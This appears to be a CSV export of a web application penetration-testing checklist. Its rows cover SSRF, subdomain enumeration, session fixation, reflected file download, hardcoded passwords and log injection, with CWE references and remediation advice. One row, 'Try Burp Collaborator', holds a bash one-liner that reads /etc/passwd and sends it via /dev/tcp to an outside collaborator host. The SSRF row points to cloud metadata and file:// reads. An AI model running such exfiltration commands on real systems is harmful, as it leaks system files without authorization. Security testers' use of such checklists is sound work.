+In a Server-Side Request Forgery (SSRF) attack, the attacker can abuse functionality on the server to read or update internal resources. The attacker can supply or a modify a URL which the code running on the server will read or submit data to, and by carefully selecting the URLs, the attacker may be able to read server configuration such as AWS metadata, connect to internal services like http enabled databases or perform post requests towards internal services which are not intended to be exposed.
+
+Description
+The target application may have functionality for importing data from a URL, publishing data to a URL or otherwise reading data from a URL that can be tampered with. The attacker modifies the calls to this functionality by supplying a completely different URL or by manipulating how URLs are built (path traversal etc.).
+
+When the manipulated request goes to the server, the server-side code picks up the manipulated URL and tries to read data to the manipulated URL. By selecting target URLs the attacker may be able to read data from services that are not directly exposed on the internet:
+
+Cloud server meta-data - Cloud services such as AWS provide a REST interface on http://169.254.169.254/ where important configuration and sometimes even authentication keys can be extracted
+Database HTTP interfaces - NoSQL database such as MongoDB provide REST interfaces on HTTP ports. If the database is expected to only be available to internally, authentication may be disabled and the attacker can extract data
+Internal REST interfaces
+Files - The attacker may be able to read files using file:// URIs
+The attacker may also use this functionality to import untrusted data into code that expects to only read data from trusted sources, and as such circumvent input validation.",Extras,,,"The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination.
+
+By providing URLs to unexpected hosts or ports, attackers can make it appear that the server is sending the request, possibly bypassing access controls such as firewalls that prevent the attackers from accessing the URLs directly. The server can be used as a proxy to conduct port scanning of hosts in internal networks, use other URLs such as that can access documents on the system (using file://), or use other protocols such as gopher:// or tftp://, which may provide greater control over the contents of requests.
+
+This weakness is also known as XSPA:	Cross Site Port Attack. ",,TRUE,https://portswigger.net/blog/cracking-the-lens-targeting-https-hidden-attack-surface,https://www.owasp.org/index.php/Server_Side_Request_Forgery,https://www.owasp.org/index.php/Server_Side_Request_Forgery,918,,,
+EXT-20171219T044642,Extras,TTestName,,,TTestName (imported the CSV header by mistake),,1,TTesterSupport,Extras,,,No CWE was found to represent this issue/finding.,N/A,,,,TTRef,10,,,
+EXT-20171219T045330,Extras,Run dependency check for NodeJS,,,Run dependency check for NodeJS,,0,"On Macbook Air: /Users/eric/Downloads/dependency-check/bin/check-waptrun.sh
+",Extras,,,Weaknesses in this category are related to the A9 category in the OWASP Top Ten 2013.,,,https://www.owasp.org/index.php/Top_10_2013-A9-Using_Components_with_Known_Vulnerabilities,,https://www.owasp.org/index.php/OWASP_Dependency_Check,937,,,
+EXT-20180113T193027,Extras,TODO Dev,,,Features to implement,,0,Note functionality to fix or implement,Extras,,,The product does not validate or incorrectly validates input that can affect the control flow or data flow of a program.,,,,,,20,,,
+EXT-20161108T220809,Extras,Search for subdomains,,,Subdomains found,,0,"Use a subdomain research tool to find subdomains:
+- Search engines (Google, Bing, Yahoo, Baidu)
+- https://virustotal.com/ - Search for “domain:target.com” and virustotal will provide extensive information in addition to Observed subdomains.
+- https://dnsdumpster.com - The name says it all. Enter the target domain, hit search.
+- https://crt.sh/?q=%25target.com - Sometimes SSL is a goldmine of information. Use this site by searching for “%target.com” and it’ll get back with subdomains to you. 
+- https://censys.io - Not great but has some useful information sometimes.
+- http://searchdns.netcraft.com/
+- https://www.shodan.io
+- https://github.com/aboul3la/Sublist3r
+- https://www.dnsdb.info/
+- Similar Web ($$$) - used Chrome extensions (using leaked internal subdomains)
+
+Bruteforcing:
+    Subbrute - A DNS meta-query spider that enumerates DNS records, and subdomains.
+    dnscan - a python wordlist-based DNS subdomain scanner.
+    Nmap - Yes it's a port scanner, but it can bruteforce subdomains too (check nmap scripts)
+    Recon-Ng - The recon-ng framework has a brute_hosts module that allows to bruteforce subdomains.
+    DNSRecon - A powerful DNS enumeration script
+    Fierce - A semi-lightweight enumeration scanner
+    Gobuster - Alternative directory and file busting tool written in Go
+    DNSenum - Offers recursive and threaded subdomain enumeration.
+    AltDNS - offers bruteforcing based on permutations of already found domains",Extras,,,,,,,,https://dnsdumpster.com,0,,,
+EXT-20180313T031606,Extras,Source Code Disclosure,,,Source Code Disclosure,,2,,Extras,,,"Source code intended to be kept server-side can sometimes end up being disclosed to users. Such code may contain sensitive information such as database passwords and secret keys, which may help malicious users formulate attacks against the application.","Server-side source code is normally disclosed to clients as a result of typographical errors in scripts or because of misconfiguration, such as failing to grant executable permissions to a script or directory. Review the cause of the code disclosure and prevent it from happening.",,,,,18,,,
+EXT-20180115T043949,Extras,Run snyk static analyzer,,,Use static code analyzer to find components with known vulnerabilities,,0,Run snyk by pointing it to the github repo.,Extras,,,,,,,,https://snyk.io/test,937,,,
+EXT-20180313T184839,Extras,Vulnerable version of jquery,,,Vulnerable version of jquery,,2,Just import this from Burp results (Retire.js extension),Extras,,,Vulnerable version of the library 'jquery' found.,,,http://research.insecurelabs.org/jquery/test/,,,937,,TRUE,
+EXT-20180313T185717,Extras,Vulnerable version of bootstrap,,,Vulnerable version of bootstrap,,1,,Extras,,,Weaknesses in this category are related to the A9 category in the OWASP Top Ten 2013.,,,,,,937,,TRUE,
+EXT-20180315T133152,Extras,Session hijacking (session fixation exploit),,,Authentication bypass (session fixation exploit),,3,,Extras,,,"Authenticating a user, or otherwise establishing a new user session, without invalidating any existing session identifier gives an attacker the opportunity to steal authenticated sessions.",,,,,,384,,,
+EXT-20180329T180937,Extras,Default error pages shown,,,Incorrect Error Handling  (stack traces),,2,"Check that when resources don't exist, a graceful 404 pages is displayed.",Extras,,,"The remote application does not properly handle application errors, and application stacktraces are displayed to the end user leading to information disclosure vulnerability.","Implement a standard exception handling mechanism to intercept all errors.
+
+2.5	Disable client facing Stack Traces (from CIS Benchmark for Tomcat 8.X)
+
+Perform the following to prevent Tomcat from providing debug information to the requestor during runtime errors:
+
+- Create a web page that contains the logic or message you wish to invoke when encountering a runtime error. For example purposes, assume this page is located at /error.jsp. 
+- Add a child element, <error-page>, to the <web-app>element, in the $CATALINA_HOME/conf/web.xml file. 
+- Add a child element, <exception-type>, to the <error-page> element. Set the value of the <exception-type> element to java.lang.Throwable. 
+- Add a child element, <location>, to the <error-page> element. Set the value of the <location> element to the location of page created in #1.
+
+The resulting entry will look as follows:
+
+<error-page>
+ <exception-type>java.lang.Throwable</exception-type>
+ <location>/error.jsp</location>
+</error-page>",TRUE,http://cwe.mitre.org/data/definitions/388.html,https://www.owasp.org/index.php/Error_Handling,,209,TRUE,,
+EXT-20180328T175642,Extras,Apparent gaps in code/config versioning or release management,,,Code versioning and/or release management issues,,0,"Look for traces of insufficient code or configuration version management (online backup files/packages, lots of commented code...). This would be indicating some gaps in release management and/or an offline backup strategy.",Extras,,,"Proliferation of backup files and commented code. The security tester found traces of insufficient code or configuration version management (online backup files/packages, lots of commented code...). This normally indicates that there are some gaps in release management (process, tools, training). This gap promotes the proliferation/multiplication of project artifacts that increase the attack surface when left behind (and kept available for unauthorized users).","Implement a standard issue tracker, code versioning and configuration versioning system (e.g. multiple projects/releasees in JIRA and GIT). Make sure that they're managed to be in line with the release management process you have in place. Also make sure that your release management process supports parallel projects (branching/merging/tagging...), code reuse while avoiding mass copy-pasting, consistent use via build standards, etc.",,,,,530,,,
+EXT-20180410T031925,Extras,Reflected File Download,,,Reflected File Download,,3,,Extras,,,"RFD, like many other Web attacks, begins by sending a malicious link to a victim. But unlike other attacks, RFD ends outside of the browser context:
+
+1) The user follows a malicious link to a trusted web site.
+2) An executable file is downloaded and saved on the user's machine. All security indicators show that the file was ""hosted"" on the trusted web site.
+3) The user executes the file which contains shell commands that gain complete control over the computer.
+For a Reflected File Download attack to be successful, there are three simple requirements:
+
+1) Reflected – Some user input is being ""reflected"" to the response content. This is used to inject shell commands.
+2) Filename – The URL of the vulnerable site or API is permissive and accepts additional input. This is often the case and is used by attackers to set the extension of the file to an executable extension.
+3) Download – The response is being downloaded and a file is created ""on-the-fly"" by the Web browser. The browser then sets the attacker-controlled filename that was parsed in requirement 2 above.","Reflected File Download can be mitigated by securing Web facing interfaces using the following:
+
+a) Use exact URL mapping – when mapping APIs, Servlet and web pages and when writing rewrite rules, make sure that hackers cannot enter additional characters after the resource name. Any additional characters in the URL should result in a 404 error.
+
+b) Do not escape! Encode! – Escaping such as Backslash escaping always contains the problematic character. If escaping is used double quotes (“) turn into (\”). Prefer encoding of user controlled input. In JavaScript for example, double quotes (“) turn into (\x22) or (\u0022) which is a lot safer.
+
+c) Add Content-Disposition with a “filename” attribute for APIs: Content-Disposition: attachment; filename=1.txt
+
+Setting the filename attribute spares the Browser from trying to guess what the filename is. Web APIs like JSON/JSONP are not user facing. There is no reason for a user to access such APIs directly from the address bar or by following a link. By adding the above header to all API responses, the file is downloaded and saved as 1.txt which is considered harmless. This is also a good practice to help mitigate XSS vulnerabilities in APIs.
+
+d) Whitelist Callbacks – there has been numerous attacks that abuse JSONP Callbacks. If you think about it, you might not really need the Callback to be completely dynamic.
+
+e) Require custom headers – as mentioned before, there is no reason for a user to access APIs directly. By requiring a Custom HTTP Header for all API calls, one can harness the power of Same-Origin-Policy on the client side. This makes RFD unexploitable unless another vulnerability is involved.
+
+f) If possible, require CSRF tokens – by doing so hackers won’t be able to build a working RFD link and sent it to their victims.
+
+g) Never include user input in API usage errors – when it comes to JSON/JSONP, code is accessing code. Usage errors are rare, and when occur should be logged. The response should not include the erroneous input but rather a reference number that can be tracked down for troubleshooting.
+
+h) Remove support for Path parameters – If you don’t really use it then lose it. Most developers are not even aware of the existence of Path Parameters, and I found this section of the URL extremely vulnerable to various attacks (including XSS).
+
+i) Add X-Content-Type-Options headers – if the resource is responding with a text/plain or unknown content-type, attackers can make browser “guess” that the file is binary and required download (meeting the third RFD requirement). The following header can prevent this from happening in some browsers:
+X-Content-Type-Options: nosniff",,http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-5211,,https://www.trustwave.com/Resources/SpiderLabs-Blog/Reflected-File-Download---A-New-Web-Attack-Vector/,20,,,
+EXT-20180410T032656,Extras,Hardcoded password,,,Use of Hard-coded Password,,2,,Extras,,,"The software contains a hard-coded password, which it uses for its own inbound authentication or for outbound communication to external components.
+
+A method uses a hard-coded password that may compromise system security in a way that cannot be easily remedied. The use of a hard-coded password significantly increases the possibility that the account being protected will be compromised. Moreover, the password cannot be changed without patching the software. If a hard-coded password is compromised in a commercial product, all deployed instances may be vulnerable to attack.
+","Store passwords out-of-band from the application code. Follow best practices for protecting credentials stored in locations such as configuration or properties files.
+
+PHASE:Architecture and Design
+DESCRIPTION:For outbound authentication: store passwords outside of the code in a strongly-protected, encrypted configuration file or database that is protected from access by all outsiders, including other local users on the same system. Properly protect the key (CWE-320). If you cannot use encryption to protect the file, then make sure that the permissions are as restrictive as possible.
+
+PHASE:Architecture and Design
+DESCRIPTION:For inbound authentication: Rather than hard-code a default username and password for first time logins, utilize a first login mode that requires the user to enter a unique strong password.
+
+PHASE:Architecture and Design
+DESCRIPTION:Perform access control checks and limit which entities can access the feature that requires the hard-coded password. For example, a feature might only be enabled through the system console instead of through a network connection.
+
+PHASE:Architecture and Design
+DESCRIPTION:For inbound authentication: apply strong one-way hashes to your passwords and store those hashes in a configuration file or database with appropriate access control. That way, theft of the file/database still requires the attacker to try to crack the password. When receiving an incoming password during authentication, take the hash of the password and compare it to the hash that you have saved. Use randomly assigned salts for each separate hash that you generate. This increases the amount of computation that an attacker needs to conduct a brute-force attack, possibly limiting the effectiveness of the rainbow table method.
+
+PHASE:Architecture and Design
+DESCRIPTION:For front-end to back-end connections: Three solutions are possible, although none are complete. The first suggestion involves the use of generated passwords which are changed automatically and must be entered at given time intervals by a system administrator. These passwords will be held in memory and only be valid for the time intervals. Next, the passwords used should be limited at the back end to only performing actions valid for the front end, as opposed to having full access. Finally, the messages sent should be tagged and checksummed with time sensitive values so as to prevent replay style attacks.",,,,,259,,,
+EXT-20190110T035355,Extras,Improper Output Neutralization for Logs (CWE ID 117),,,Improper Output Neutralization for Logs (CRLF Injection),,2,,Extras,,,"The software does not neutralize or incorrectly neutralizes output that is written to logs.
+
+A function call could result in a log forging attack. Writing untrusted data into a log file allows an attacker to forge log entries or inject malicious content into log files. Corrupted log files can be used to cover an attacker's tracks or as a delivery mechanism for an attack on a log viewing or processing utility. For example, if a web administrator uses a browser-based utility to review logs, a cross-site scripting attack might be possible.","Avoid directly embedding user input in log files when possible. Sanitize untrusted data used to construct log entries by using a safe logging mechanism such as the OWASP ESAPI Logger, which will automatically remove unexpected carriage returns and line feeds and can be configured to use HTML entity encoding for non-alphanumeric data. Only write custom blacklisting code when absolutely necessary. Always validate untrusted input to ensure that it conforms to the expected format, using centralized data validation routines when possible.
+
+PHASE:Implementation
+STRATEGY:Input Validation
+DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
+
+PHASE:Implementation
+STRATEGY:Output Encoding
+DESCRIPTION:Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.
+
+PHASE:Implementation
+STRATEGY:Input Validation
+DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.",TRUE,,,,117,,,
+EXT-20190202T182911,Extras,"External service interaction (HTTP SSRF, Burp Issue)",,,Server-Side Request Forgery (SSRF),,,,Extras,,,"External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application. However, in many cases, it can indicate a vulnerability with serious consequences.
+
+The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.",,,,,https://portswigger.net/kb/issues/00300210_external-service-interaction-http,918,,,
+EXT-20190303T150457,Extras,Vulnerabilities from network scan of public footprint,,,Network vulnerability scan results for public footprint,,0,Copy results from recent vuln scan.,Extras,,,,,TRUE,,,,0,TRUE,,
+EXT-20190303T170006,Extras,Nmap script scan,,,Nmap script scan results,,0,Run nmap script scan,Extras,,,,,,,,,0,,,
+EXT-20190303T173125,Extras,Software Composition Analysis (SCA) Results,,,Software Composition Analysis (SCA),,0,Include results from software composition analysis.,Extras,,,"Ensure that SCA was performed that the results are acceptable (no High+, no risky CVEs...).",,TRUE,,,,0,,,
+EXT-20190303T191547,Extras,App screenshots,,,App. Screenshots,,0,Just take a few screenshots of the app under test for future reference.,Extras,,,"Just a few screenshots of the app, during testing.",N/A.,TRUE,,,,0,,,
+EXT-20190306T191531,Extras,Test for credit card number disclosure,,,Credit card number entry is accepted and data is propagated (missing 'DLP' requirement?),,0,"Search app data and logs for possible disclosure of credit card information. If possible, use SIEM tools to support log investigation. ",Extras,,,The software may be storing sensitive information without properly limiting read or write access by unauthorized actors.,Review the sensitivity of the data and make sure that the system has appropriate controls to avoid inadvertent disclosure of sensitive information.,TRUE,,,,200,TRUE,,
+EXT-20190310T180722,Extras,Testing methodology and approach,,,Testing Approach,,0,Take notes on the approach taken during the testing.,Extras,,,,,TRUE,,,,0,,,
+EXT-20190311T130927,Extras,Information Leakage,,,Usage analytics sent to Google Analytics,,0,,Extras,,,"The software uses a resource that contains sensitive data, but it does not properly remove that data before it stores, transfers, or shares the resource with actors in another control sphere.","PHASE:Requirements
+DESCRIPTION:Clearly specify which information should be regarded as private or sensitive, and require that the product offers functionality that allows the user to cleanse the sensitive information from the resource before it is published or exported to other parties.
+
+PHASE:Architecture and Design
+STRATEGY:Separation of Privilege
+DESCRIPTION:Compartmentalize the system to have safe areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area. Ensure that appropriate compartmentalization is built into the system design and that the compartmentalization serves to allow for and further reinforce privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide when it is appropriate to use and to drop system privileges.
+
+PHASE:Implementation
+STRATEGY:Attack Surface Reduction
+EFFECTIVENESS:Defense in Depth
+DESCRIPTION:Use naming conventions and strong types to make it easier to spot when sensitive data is being used. When creating structures, objects, or other complex entities, separate the sensitive and non-sensitive data as much as possible.
+
+PHASE:Implementation
+DESCRIPTION:Avoid errors related to improper resource shutdown or release (CWE-404), which may leave the sensitive data within the resource if it is in an incomplete state.",,,,,212,,,
+EXT-20190311T145050,Extras,Outdated/vulnerable client-side component,,,Outdated/vulnerable client-side components,,2,,Extras,,,,"PHASE:Implementation
+DESCRIPTION:Carefully check each input parameter against a rigorous positive specification (whitelist) defining the specific characters and format allowed. All input should be neutralized, not just parameters that the user is supposed to specify, but all data in the request, including hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. We often encounter data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.
+
+PHASE:Implementation
+STRATEGY:Output Encoding
+DESCRIPTION:Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component. The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.
+
+PHASE:Implementation
+DESCRIPTION:With Struts, write all data from form beans with the bean's filter attribute set to true.
+
+PHASE:Implementation
+STRATEGY:Attack Surface Reduction
+DESCRIPTION:To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.
+EFFECTIVENESS:Defense in Depth",,,,,1026,,,
+EXT-20190312T170431,Extras,Scoping Information,,,Scoping Information,,0,"Provide high-level scoping information for the project, to be included in the report.",Extras,,,,,TRUE,,,,0,,,
+EXT-20190307T231008,Extras,Run Burp Scanner,,,Burp scan and analysis,,0,Run Burp Scanner against all important app sections/contexts. Review all issues with Severity >= Medium.,Extras,,,,,TRUE,https://support.portswigger.net/customer/portal/articles/1783127-using-burp-scanner,,https://support.portswigger.net/customer/portal/articles/1783127-using-burp-scanner,0,,,
+EXT-20190314T030421,Extras,Try Burp Collaborator,,,Try Burp Collaborator,,0,"Try these:
+$ echo -e ""GET / HTTP/1.1\r\nhost: http://qga92es194u6457ezgb1v9zn7ed51u.burpcollaborator.net\r\nConnection: close\r\n\r\n$(cat /etc/passwd)"" > /dev/tcp/qga92es194u6457ezgb1v9zn7ed51u.burpcollaborator.net/80
+
+Details on /dev/tcp:
+- http://tldp.org/LDP/abs/html/devref1.html",Extras,,,,,,,,https://portswigger.net/burp/documentation/collaborator,0,,,
+EXT-20190314T044458,Extras,Check CSP Headers,,,Insecure Content Security Policy setting,,2,,Extras,,,The software does not properly verify that the source of data or communication is valid.,,TRUE,,,,346,,,
+EXT-20190314T154101,Extras,WAPT Runner testing,,,WAPT Runner testing,,0,Just a dummy test to try stuff in WAPT Runner.,Extras,,,,,,,,,0,,,
+EXT-20190316T152442,Extras,Check for HttpOnly flag on important cookies,,,Sensitive Cookie Without 'HttpOnly' Flag,,2,,Extras,,,,"PHASE:Implementation
+DESCRIPTION:Leverage the HttpOnly flag when setting a sensitive cookie in a response.
+EFFECTIVENESS:High",TRUE,,,,1004,,,
+EXT-20201110T160545,Extras,Scanning APIs with Burp Scanner,,,Scanning APIs with Burp Scanner,Extra Test,0,Go the TTRef for details.,Extras,Extras,,,,FALSE,http://cwe.mitre.org/index.html,https://github.com/OWASP/CheatSheetSeries/blob/master/Index.md,https://portswigger.net/burp/documentation/desktop/scanning/api-scanning,0,FALSE,FALSE,FALSE
